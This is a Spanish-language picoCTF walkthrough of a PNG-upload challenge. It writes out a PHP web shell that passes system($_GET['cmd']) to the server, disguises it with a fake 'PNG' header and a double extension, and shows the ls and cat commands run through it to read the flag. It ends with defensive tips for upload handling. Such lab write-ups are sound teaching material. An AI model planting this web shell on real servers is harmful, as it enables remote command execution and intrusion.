**Reto**
	

**Descripción**
	I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:62385/)!

**Solución**
	Comandos para CLI
		Se creó un archivo PHP con ejecución de comandos:
			nano webshell.php
			PNG
			<?php
				// Verifica si el parámetro 'cmd' está presente en la URL
				if(isset($_GET['cmd'])) {
					echo "<pre>";
					// Ejecuta el comando del sistema y muestra el resultado
					system($_GET['cmd']);
					echo "</pre>";
				}
			?>
		Luego se agregó manualmente la cabecera `PNG` al inicio y se renombró:
			cp webshell.php webshell.png.php
		Verificación con `xxd`:
			xxd webshell.png.php
		Esto permite:
			Pasar la validación como PNG
			Seguir siendo interpretado como PHP por el servidor
/
	Resultados de la CLI
		┌──(kali㉿kali)-[~]
		└─$ nano webshell.php
																										 
		┌──(kali㉿kali)-[~]
		└─$ cp webshell.php webshell.png.php
																										 
		┌──(kali㉿kali)-[~]
		└─$ xxd webshell.png.php
		00000000: 504e 470a 3c3f 7068 700a 2020 2020 2f2f  PNG.<?php.    //
		00000010: 2056 6572 6966 6963 6120 7369 2065 6c20   Verifica si el 
		00000020: 7061 72c3 a16d 6574 726f 2027 636d 6427  par..metro 'cmd'
		00000030: 2065 7374 c3a1 2070 7265 7365 6e74 6520   est.. presente 
		00000040: 656e 206c 6120 5552 4c0a 2020 2020 6966  en la URL.    if
		00000050: 2869 7373 6574 2824 5f47 4554 5b27 636d  (isset($_GET['cm
		00000060: 6427 5d29 2920 7b0a 2020 2020 2020 2020  d'])) {.        
		00000070: 6563 686f 2022 3c70 7265 3e22 3b0a 2020  echo "<pre>";.  
		00000080: 2020 2020 2020 2f2f 2045 6a65 6375 7461        // Ejecuta
		00000090: 2065 6c20 636f 6d61 6e64 6f20 6465 6c20   el comando del 
		000000a0: 7369 7374 656d 6120 7920 6d75 6573 7472  sistema y muestr
		000000b0: 6120 656c 2072 6573 756c 7461 646f 0a20  a el resultado. 
		000000c0: 2020 2020 2020 2073 7973 7465 6d28 245f         system($_
		000000d0: 4745 545b 2763 6d64 275d 293b 0a20 2020  GET['cmd']);.   
		000000e0: 2020 2020 2065 6368 6f20 223c 2f70 7265       echo "</pre
		000000f0: 3e22 3b0a 2020 2020 7d0a 3f3e 0a         >";.    }.?>.
																										 
		┌──(kali㉿kali)-[~]
		└─$
		<html><head>
				<title>File Upload Page</title>
			</head>
			<body>
				<h1>Welcome to my PNG processing app</h1>
			
				File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
				<form method="POST" enctype="multipart/form-data">
					<input type="file" name="file" accept=".png">
					<input type="submit" value="Upload File">
				</form>
		</body></html>
/
	Browser
		http://atlas.picoctf.net:62385/uploads/webshell.png.php
			<head></head><html><head></head><body>PNG
			</body></html>
		http://atlas.picoctf.net:62385/uploads/webshell.png.php?cmd=ls
			<html><head></head><body>PNG
			<pre>webshell.png.php
			</pre></body></html>
		http://atlas.picoctf.net:62385/uploads/webshell.png.php?cmd=ls%20..
			<html><head></head><body>PNG
			<pre>MFRDAZLDMUYDG.txt
			index.php
			instructions.txt
			robots.txt
			uploads
			</pre></body></html>
		http://atlas.picoctf.net:62385/uploads/webshell.png.php?cmd=cat%20../MFRDAZLDMUYDG.txt
			<html><head></head><body>PNG
			<pre>/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */</pre></body></html>
		El sitio acepta archivos `.png` y muestra el mensaje:
			File uploaded successfully and is a valid PNG file.
		Esto indica que la validación probablemente:
			Solo revisa la cabecera `PNG`
			No valida realmente el contenido interno

**Notes**
	Indicadores típicos en este tipo de retos:
		Validación solo por extensión
		Validación solo por magic bytes
		Directorio `/uploads/` ejecutable
		Permite doble extensión
	Buenas prácticas defensivas:
		Validar MIME real
		Re-encodear imágenes
		Almacenar archivos fuera del webroot
		Deshabilitar ejecución en `/uploads`

**Referencias**
	